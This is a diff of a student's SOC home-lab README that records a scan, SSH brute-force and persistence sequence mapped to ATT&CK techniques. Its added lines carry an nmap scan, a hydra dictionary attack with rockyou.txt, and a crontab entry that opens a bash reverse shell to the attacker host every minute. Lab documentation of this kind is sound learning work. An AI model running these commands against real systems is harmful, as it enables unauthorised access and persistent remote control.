@@ -76,7 +76,7 @@ The full attack was executed from Kali Linux against the Linux Mint target, prog
 **Action:** Port scan to identify open services on the target  
 
 ```bash
-nmap -sV -p 22 <target-ip>
+nmap -sV -p 22 10.xx.xx.135
 ```
 
 | ATT&CK ID | Tactic | Description |
@@ -90,7 +90,7 @@ nmap -sV -p 22 <target-ip>
 **Action:** Dictionary attack against SSH using a wordlist  
 
 ```bash
-hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://10.xx.xx.135
 ```
 
 | ATT&CK ID | Tactic | Description |
@@ -104,7 +104,7 @@ hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
 **Action:** Scheduled a recurring task to re-establish attacker presence  
 
 ```bash
-(crontab -l; echo "* * * * * /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1") | crontab -
+(crontab -l; echo "* * * * * /bin/bash -i >& /dev/tcp/10.xx.xx.124/4444 0>&1") | crontab -
 ```
 
 | ATT&CK ID | Tactic | Description |
@@ -234,8 +234,7 @@ soc-home-lab/
 
 **Riyajath Hameed P.**  
 Final-year B.Sc Computer Science | Aspiring SOC Analyst  
-[LinkedIn](https://linkedin.com/in/) · [TryHackMe](https://tryhackme.com/) · [GitHub](https://github.com/)
+[LinkedIn](https://linkedin.com/riyajath/) · [GitHub](https://github.com/Riyajath)
 
 ---
 
-*Built for learning. Every alert in this lab was earned.*
